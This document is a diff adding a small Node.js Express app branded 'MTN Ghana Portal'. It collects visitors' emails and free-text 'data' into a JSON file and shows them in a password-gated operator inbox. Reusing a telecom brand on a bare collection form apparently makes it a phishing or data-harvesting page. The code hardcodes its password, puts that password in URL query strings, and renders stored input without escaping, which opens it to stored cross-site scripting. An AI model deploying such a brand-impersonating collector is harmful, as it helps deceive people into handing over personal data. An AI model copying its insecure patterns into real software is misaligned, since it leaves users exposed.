@@ -1,0 +1,17 @@
+const express=require('express');
+const fs=require('fs');
+const app=express();
+app.use(express.urlencoded({extended:true}));
+const F='./database.json';
+const P='GhanaShield99';
+const PORT=process.env.PORT||3000;
+if(!fs.existsSync(F))fs.writeFileSync(F,'[]');
+const g=()=>{try{return JSON.parse(fs.readFileSync(F))}catch{return []}};
+const s=d=>fs.writeFileSync(F,JSON.stringify(d,null,2));
+app.get('/',(req,res)=>res.send('<h2>MTN Ghana Portal</h2><form method=POST><input name=email placeholder=Email><br><br><input name=text placeholder=Data><br><br><button>Submit</button></form><a href=/login>Login</a>'));
+app.post('/',(req,res)=>{let d=g();d.push({id:Date.now(),email:req.body.email,text:req.body.text,time:new Date().toLocaleString()});s(d);res.send('Saved! <a href=/>Back</a>');});
+app.get('/login',(req,res)=>res.send('<form method=POST action=/login>Password:<input name=pass type=password><button>Login</button></form>'));
+app.post('/login',(req,res)=>{if(req.body.pass===P)res.redirect('/inbox?key='+P);else res.send('Wrong');});
+app.get('/inbox',(req,res)=>{if(req.query.key!==P)return res.redirect('/login');let d=g();let l=d.map(x=>'<div>'+x.email+' - '+x.text+' <a href=/delete/'+x.id+'?key='+P+'>Del</a></div>').join('');res.send('<h2>Inbox '+d.length+'</h2>'+l);});
+app.get('/delete/:id',(req,res)=>{if(req.query.key!==P)return res.redirect('/login');let d=g();s(d.filter(x=>x.id!=req.params.id));res.redirect('/inbox?key='+P);});
+app.listen(PORT);
